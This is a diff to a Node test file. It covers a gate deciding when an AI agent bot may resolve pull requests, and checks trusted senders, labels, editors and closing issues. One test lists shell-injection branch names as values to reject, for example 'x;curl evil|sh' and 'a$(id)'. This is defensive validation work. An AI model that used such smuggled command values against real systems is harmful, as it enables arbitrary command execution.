@@ -1,6 +1,6 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { checkTrigger, resolveEffort, trustedComments, trustedSubIssues, parseList } from "../lib/gate.mjs";
+import { checkTrigger, checkResolve, closingIssue, latestLabeled, parseRequest, isResolveComment, resolveEffort, trustedComments, trustedSubIssues, parseList } from "../lib/gate.mjs";
 
 const event = (over = {}) => ({
   action: "labeled",
@@ -135,4 +135,186 @@ test("resolveEffort ignores unknown levels and takes the highest of several labe
   assert.equal(resolveEffort({ ...base, labels: [{ name: "effort:huge" }] }), "medium");
   assert.equal(resolveEffort({ ...base, labels: [{ name: "effort:high" }, { name: "effort:max" }, { name: "Effort: Low" }] }), "max");
   assert.equal(resolveEffort({ ...base, labels: [], comments: [{ user: { login: "ntodd" }, body: "/effort turbo" }] }), "medium");
+});
+
+// Resolve mode.
+
+const HEAD = "a".repeat(40);
+
+test("parseRequest: no mode is a build, resolve is a resolve, and anything else fails closed", () => {
+  assert.deepEqual(parseRequest("issues", undefined), { mode: "build" });
+  assert.deepEqual(parseRequest("workflow_dispatch", { issue: "7" }), { mode: "build", issue: 7 });
+  assert.deepEqual(parseRequest("workflow_dispatch", { issue: "7", mode: "" }), { mode: "build", issue: 7 });
+  assert.deepEqual(parseRequest("workflow_dispatch", { issue: "7", mode: "resolve", pr: "9", head: HEAD }), { mode: "resolve", issue: 7, pr: 9, head: HEAD, comment: null });
+  assert.deepEqual(parseRequest("workflow_dispatch", { mode: "resolve", pr: "9", head: HEAD, comment: "6757127817" }), { mode: "resolve", issue: null, pr: 9, head: HEAD, comment: 6757127817 });
+  for (const mode of ["Resolve", "resolve ", "rebase", "resolve;build", " ", {}, ["resolve"], 1]) {
+    assert.match(parseRequest("workflow_dispatch", { issue: "7", mode, pr: "9", head: HEAD }).error, /isn't a mode agent-ready knows/);
+  }
+});
+
+test("parseRequest refuses a resolve with a missing or malformed pull request, head, issue or comment", () => {
+  const ok = { mode: "resolve", issue: "7", pr: "9", head: HEAD };
+  assert.match(parseRequest("workflow_dispatch", { ...ok, pr: "" }).error, /pull request/);
+  assert.match(parseRequest("workflow_dispatch", { ...ok, pr: "9 OR 1" }).error, /pull request/);
+  assert.match(parseRequest("workflow_dispatch", { ...ok, head: "main" }).error, /head/);
+  assert.match(parseRequest("workflow_dispatch", { ...ok, head: undefined }).error, /head/);
+  assert.match(parseRequest("workflow_dispatch", { ...ok, issue: "other/repo#7" }).error, /issue/);
+  assert.match(parseRequest("workflow_dispatch", { ...ok, issue: "", comment: "x" }).error, /comment/);
+  assert.match(parseRequest("workflow_dispatch", { ...ok, issue: "" }).error, /needs the issue .* or the \/resolve comment/);
+  assert.match(parseRequest("workflow_dispatch", { ...ok, comment: "12" }).error, /not both/);
+});
+
+test("isResolveComment takes /resolve alone", () => {
+  assert.equal(isResolveComment("/resolve"), true);
+  assert.equal(isResolveComment("/resolve\n"), true);
+  for (const body of ["/resolve please", "please /resolve", "/Resolve", "/resolve\n/effort max", "", null]) assert.equal(isResolveComment(body), false);
+});
+
+test("latestLabeled is the last time the label was added", () => {
+  const events = [
+    { label: "agent-ready", actor: "ntodd", at: "2026-11-01T00:00:00Z" },
+    { label: "agent-working", actor: "ntodd-agent[bot]", at: "2026-11-01T00:01:00Z" },
+    { label: "agent-ready", actor: "stranger", at: "2026-11-02T00:00:00Z" },
+  ];
+  assert.equal(latestLabeled(events, "agent-ready").actor, "stranger");
+  assert.equal(latestLabeled(events, "bug"), null);
+});
+
+const BOT = "ntodd-agent[bot]";
+const agentPr = (over = {}) => ({
+  number: 9,
+  state: "open",
+  author: BOT,
+  createdAt: "2026-11-07T13:00:00Z",
+  headSha: HEAD,
+  headRef: "feature/7-fix",
+  headRepo: "ntodd/sandbox",
+  baseRef: "main",
+  defaultBranch: "main",
+  labels: [],
+  editors: [],
+  closes: { total: 1, more: false, issues: [{ number: 7, repo: "ntodd/sandbox" }] },
+  ...over,
+});
+const myIssue = (over = {}) => ({ number: 7, state: "open", user: { login: "ntodd" }, labels: [{ name: "agent-done" }], body: "Broken", editors: [], ...over });
+const labeledBy = (actor, at = "2026-11-07T12:00:00Z") => ({ label: "agent-ready", actor, at });
+const resolve = (over = {}) => ({
+  request: { mode: "resolve", issue: 7, pr: 9, head: HEAD, comment: null },
+  sender: { login: "github-actions[bot]" },
+  pr: agentPr(),
+  issue: myIssue(),
+  labeled: labeledBy("ntodd"),
+  repo: "ntodd/sandbox",
+  label: "agent-ready",
+  trustedUsers: ["ntodd"],
+  appBot: BOT,
+  ...over,
+});
+
+test("checkResolve allows the App's PR for an issue a trusted user wrote and labeled, from the dispatching jobs or a trusted user", () => {
+  assert.deepEqual(checkResolve(resolve()), { run: true, kind: "agent" });
+  assert.equal(checkResolve(resolve({ sender: { login: "NTodd" } })).run, true);
+  // The gate has no App ID, so it leaves the author to run/index.mjs. Only
+  // null does that: a login that came out empty refuses everything.
+  assert.equal(checkResolve(resolve({ appBot: null, pr: agentPr({ author: "someone" }) })).run, true);
+  for (const appBot of ["", undefined]) assert.equal(checkResolve(resolve({ appBot, pr: agentPr({ author: "someone" }) })).run, false);
+  // The App edits its own PRs' descriptions, which is fine on this path.
+  assert.equal(checkResolve(resolve({ pr: agentPr({ editors: [BOT] }) })).run, true);
+});
+
+test("checkResolve refuses a sender who isn't trusted, and with no trusted users at all", () => {
+  assert.match(checkResolve(resolve({ sender: { login: BOT } })).reason, /ntodd-agent\[bot\] started the run and isn't trusted/);
+  assert.equal(checkResolve(resolve({ trustedUsers: [] })).run, false);
+});
+
+test("checkResolve refuses a PR the App opened for an issue nobody labeled", () => {
+  assert.match(checkResolve(resolve({ labeled: null })).reason, /nobody labeled #7 agent-ready/);
+});
+
+test("checkResolve refuses a PR opened before the trusted label", () => {
+  const res = checkResolve(resolve({ pr: agentPr({ createdAt: "2026-11-07T11:59:59Z" }) }));
+  assert.match(res.reason, /#9 was opened before #7 was last labeled agent-ready/);
+  assert.equal(checkResolve(resolve({ pr: agentPr({ createdAt: "2026-11-07T12:00:00Z" }) })).run, false, "at the same second doesn't count as after");
+});
+
+test("checkResolve refuses an issue whose latest agent-ready label came from someone untrusted", () => {
+  assert.match(checkResolve(resolve({ labeled: labeledBy(BOT) })).reason, /ntodd-agent\[bot\] last labeled #7 agent-ready and isn't trusted/);
+});
+
+test("checkResolve takes github-actions[bot]'s label on a flake-hunt issue, and refuses it on an ordinary one", () => {
+  assert.equal(checkResolve(resolve({ issue: flakeIssue({ number: 7, editors: [] }), labeled: labeledBy("github-actions[bot]") })).run, true);
+  assert.match(checkResolve(resolve({ labeled: labeledBy("github-actions[bot]") })).reason, /github-actions\[bot\] last labeled #7/);
+});
+
+test("checkResolve refuses an issue that's closed, a stranger's, a pull request, or edited by someone untrusted", () => {
+  assert.match(checkResolve(resolve({ issue: myIssue({ state: "closed" }) })).reason, /#7 isn't open/);
+  assert.match(checkResolve(resolve({ issue: myIssue({ user: { login: "stranger" } }) })).reason, /stranger wrote/);
+  assert.match(checkResolve(resolve({ issue: myIssue({ pull_request: {} }) })).reason, /#7 is a pull request/);
+  assert.match(checkResolve(resolve({ issue: myIssue({ editors: [BOT] }) })).reason, /ntodd-agent\[bot\] edited #7 and isn't trusted/);
+  assert.match(checkResolve(resolve({ issue: null })).reason, /no issue #7/);
+});
+
+test("checkResolve refuses a PR that isn't the App's, isn't open, is a fork's, or doesn't go into the default branch", () => {
+  assert.match(checkResolve(resolve({ pr: agentPr({ author: "stranger" }) })).reason, /stranger opened #9, not ntodd-agent\[bot\]/);
+  assert.match(checkResolve(resolve({ pr: agentPr({ state: "merged" }) })).reason, /#9 isn't open/);
+  assert.match(checkResolve(resolve({ pr: agentPr({ headRepo: "stranger/sandbox" }) })).reason, /#9's branch is in stranger\/sandbox/);
+  assert.match(checkResolve(resolve({ pr: agentPr({ headRepo: "" }) })).reason, /#9's branch is in a repo that's gone/);
+  assert.match(checkResolve(resolve({ pr: agentPr({ baseRef: "release" }) })).reason, /#9 goes into release, not main/);
+  assert.match(checkResolve(resolve({ pr: null })).reason, /no pull request #9/);
+});
+
+test("checkResolve refuses branch names that could read as more than a word in a shell", () => {
+  for (const headRef of ["x;curl evil|sh", "a$(id)", "a`id`", "-delete", "a b", ""]) {
+    assert.match(checkResolve(resolve({ pr: agentPr({ headRef }) })).reason, /branch names have characters/);
+  }
+  assert.equal(checkResolve(resolve({ pr: agentPr({ headRef: "feature/7-fix_it.v2" }) })).run, true);
+});
+
+test("checkResolve refuses an own PR whose title or description someone untrusted edited", () => {
+  assert.match(checkResolve(mine({ pr: myPr({ editors: ["ntodd", BOT] }) })).reason, /ntodd-agent\[bot\] edited #12's title or description and isn't trusted/);
+  assert.match(checkResolve(mine({ pr: myPr({ editors: undefined }) })).reason, /edited #12's title or description/);
+  assert.equal(checkResolve(mine({ pr: myPr({ editors: ["NTodd"] }) })).run, true);
+});
+
+test("checkResolve refuses a cross-repo, ambiguous, missing or partly fetched closing reference", () => {
+  const closes = (c) => checkResolve(resolve({ pr: agentPr({ closes: c }) })).reason;
+  assert.match(closes({ total: 1, more: false, issues: [{ number: 7, repo: "other/repo" }] }), /#9 closes other\/repo#7, which is in another repo/);
+  assert.match(closes({ total: 2, more: false, issues: [{ number: 7, repo: "ntodd/sandbox" }, { number: 8, repo: "ntodd/sandbox" }] }), /#9 closes 2 issues, not exactly one/);
+  assert.match(closes({ total: 0, more: false, issues: [] }), /#9 closes 0 issues/);
+  assert.match(closes({ total: 12, more: true, issues: [{ number: 7, repo: "ntodd/sandbox" }] }), /couldn't read everything #9 closes/);
+  assert.match(closes({ total: 2, more: false, issues: [{ number: 7, repo: "ntodd/sandbox" }] }), /couldn't read everything #9 closes/);
+  assert.match(closes(null), /couldn't read everything #9 closes/);
+  assert.match(closes({ total: 1, more: false, issues: [{ number: 8, repo: "ntodd/sandbox" }] }), /#9 closes #8, not #7/);
+  assert.deepEqual(closingIssue(agentPr(), "NTodd/Sandbox"), { issue: 7 });
+});
+
+const myPr = (over = {}) => agentPr({ number: 12, author: "ntodd", headRef: "feature/mine", closes: { total: 0, more: false, issues: [] }, ...over });
+const ask = (over = {}) => ({ id: 41, pr: 12, body: "/resolve", author: "ntodd", ...over });
+const mine = (over = {}) =>
+  resolve({ request: { mode: "resolve", issue: null, pr: 12, head: HEAD, comment: 41 }, pr: myPr(), issue: null, labeled: null, comment: ask(), ...over });
+
+test("checkResolve allows a trusted user's own PR when a trusted /resolve comment on it asked", () => {
+  assert.deepEqual(checkResolve(mine()), { run: true, kind: "own" });
+});
+
+test("checkResolve refuses /resolve on a PR an untrusted user wrote, on a fork's PR, or on one whose base isn't the default branch", () => {
+  assert.match(checkResolve(mine({ pr: myPr({ author: "stranger" }) })).reason, /stranger opened #12 and isn't trusted/);
+  assert.match(checkResolve(mine({ pr: myPr({ author: BOT }) })).reason, /ntodd-agent\[bot\] opened #12 and isn't trusted/);
+  assert.match(checkResolve(mine({ pr: myPr({ headRepo: "ntodd/fork" }) })).reason, /#12's branch is in ntodd\/fork/);
+  assert.match(checkResolve(mine({ pr: myPr({ baseRef: "release" }) })).reason, /#12 goes into release, not main/);
+});
+
+test("checkResolve refuses an own-PR resolve with no comment, a comment on another PR, one that says something else, or one an untrusted user wrote", () => {
+  assert.match(checkResolve(mine({ comment: null })).reason, /no \/resolve comment 41/);
+  assert.match(checkResolve(mine({ comment: ask({ pr: 13 }) })).reason, /comment 41 isn't on #12/);
+  assert.match(checkResolve(mine({ comment: ask({ body: "/resolve and merge it" }) })).reason, /comment 41 doesn't say \/resolve/);
+  assert.match(checkResolve(mine({ comment: ask({ author: "stranger" }) })).reason, /stranger wrote the \/resolve comment and isn't trusted/);
+});
+
+test("github-actions[bot] may dispatch a resolve, but still only builds flake-hunt's issues", () => {
+  assert.equal(checkResolve(resolve()).run, true);
+  const req = parseRequest("workflow_dispatch", { issue: "7" });
+  assert.equal(req.mode, "build");
+  const issue = { number: 7, state: "open", user: { login: "ntodd" }, labels: [{ name: "agent-ready" }], body: "Bump the deps" };
+  assert.match(checkTrigger(...dispatch(issue)).reason, /may only start runs on flake-hunt's issues/);
 });
